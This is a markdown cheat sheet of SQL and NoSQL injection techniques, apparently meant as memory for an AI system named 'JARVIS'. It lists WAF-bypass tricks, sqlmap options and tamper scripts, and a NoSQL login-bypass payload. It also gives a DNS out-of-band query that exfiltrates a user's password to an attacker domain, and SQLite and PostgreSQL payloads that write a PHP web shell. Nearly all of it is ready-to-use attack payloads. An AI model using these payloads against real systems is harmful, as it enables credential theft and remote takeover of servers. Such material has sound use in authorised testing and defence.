# GEMINI SQL INJECTION KNOWLEDGE BASE
# Integrated into JARVIS Memory System

## 1. ADVANCED BYPASS TECHNIQUES

### HTTP Parameter Pollution (HPP)
- **Concept:** Sending multiple parameters with the same name.
- **Example:** `id=1&id=1+AND+1=1`
- **Bypass:** Some WAFs only check the first instance, while the application uses the last (or vice versa).

### Chunked Transfer Encoding
- **Concept:** Splitting the request body into chunks to hide payloads from some WAFs.
- **Payload:**
```
Transfer-Encoding: chunked

5
id=1 
6
union 
7
select 
...
```

### SQL Comment Obfuscation
- **Bypass:** Use inline comments to break up keywords.
- **Example:** `SEL/**/ECT` instead of `SELECT`.

### Char Encoding Variants
- **URL Double Encoding:** `%2527` for `'`.
- **Unicode Escape:** `\u0027` for `'`.
- **Hex Encoding:** `0x27` for `'`.

## 2. SESSION-BASED & MULTI-PAGE SQLi
- **Concept:** Input is taken on one page (e.g., stored in session) and the result is displayed on another page.
- **Bypass Strategy:** Use `sqlmap --second-url <result_page>` to correlate the input with the output.
- **Success Indicators:** Always provide `--string` or `--not-string` to help the tool identify changes on the second page.
- **Column Hinting:** Use `--union-cols` if the column count is known or suspected to avoid exhaustive searching.

## 3. NOSQL INJECTION
- **Concept:** Exploiting NoSQL databases (like MongoDB) using operators instead of traditional SQL syntax.
- **Common Operators:** `$ne` (not equal), `$gt` (greater than), `$regex`.
- **Payload Example (JSON):** `{"email": {"$ne": null}, "password": {"$ne": null}}`
- **Bypass Trick:** If the application parses strings as JSON (as seen in some CTFs), you can send a string like `{"$ne": "random"}` to be parsed into an object.

## 4. ADVANCED VULNERABILITY TYPES

### Out-of-Band (OOB) SQLi
- **Concept:** Data is exfiltrated via a separate channel (DNS, HTTP).
- **MySQL (via `load_file`):**
  `SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.your-attacker-domain.com\\a'))`
- **DNS Exfiltration:** Triggers a DNS lookup for a subdomain that contains the sensitive data.

### Time-Based Blind (Heavy Query)
- **Concept:** Causes a delay using resource-intensive queries instead of `SLEEP()`.
- **Example:** `SELECT (SELECT a.id FROM information_schema.columns a, information_schema.columns b, information_schema.columns c LIMIT 1) = 1`

## 3. DBMS-SPECIFIC QUIRKS

### SQLite
- **Check version:** `SELECT sqlite_version()`
- **List tables:** `SELECT name FROM sqlite_master WHERE type='table'`
- **Attach DB (Persistence):** `ATTACH DATABASE '/var/www/html/shell.php' AS shell; CREATE TABLE shell.code (data TEXT); INSERT INTO shell.code VALUES ('<?php system($_GET["cmd"]); ?>');`

### PostgreSQL
- **Check version:** `SELECT version()`
- **Copy to (RCE):** `COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'`

## 4. TAMPER SCRIPTS (sqlmap+)
- `space2comment`
- `randomcase`
- `between`
- `charencode`
- `equaltolike`
- `base64encode`
- `modsecurityversioned`
- `modsecurityzeroversioned`
- `percentage`
- `overlongutf8`
